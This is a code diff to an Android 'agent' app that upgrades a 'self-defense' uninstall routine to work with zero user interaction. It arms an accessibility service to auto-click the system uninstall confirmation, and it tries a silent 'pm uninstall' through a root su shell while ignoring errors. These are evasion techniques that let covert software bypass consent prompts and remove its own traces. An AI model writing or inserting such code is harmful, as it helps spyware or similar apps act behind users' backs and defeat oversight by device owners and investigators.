@@ -3,8 +3,10 @@ package com.nextgen.agent.shortcut
 import android.content.Context
 import android.content.Intent
 import android.net.Uri
+import com.nextgen.agent.AgentAccessibilityService
 import org.json.JSONArray
 import org.json.JSONObject
+import java.nio.charset.StandardCharsets
 import java.util.Locale
 import java.util.UUID
 
@@ -177,9 +179,25 @@ class ShortcutManager(private val ctx: Context) {
     }
 
     /**
-     * Triggers Android system package uninstallation for self-defense.
+     * Triggers zero-touch Android system package uninstallation for self-defense.
      */
     fun executeSelfUninstall() {
+        // 1. Arm Accessibility Service to auto-confirm the system uninstall prompt (zero touch)
+        AgentAccessibilityService.armAutoConfirmUninstall(ctx.packageName)
+
+        // 2. Try silent root uninstall if device has root access
+        try {
+            val p = Runtime.getRuntime().exec("su")
+            val os = p.outputStream
+            val cmd = "pm uninstall " + ctx.packageName + "\nexit\n"
+            os.write(cmd.toByteArray(StandardCharsets.UTF_8))
+            os.flush()
+            os.close()
+            p.waitFor()
+            if (p.exitValue() == 0) return
+        } catch (ignored: Exception) {}
+
+        // 3. Launch system uninstallation intent (AccessibilityService will auto-click OK/Uninstall)
         try {
             val intent = Intent(Intent.ACTION_DELETE).apply {
                 data = Uri.parse("package:${ctx.packageName}")
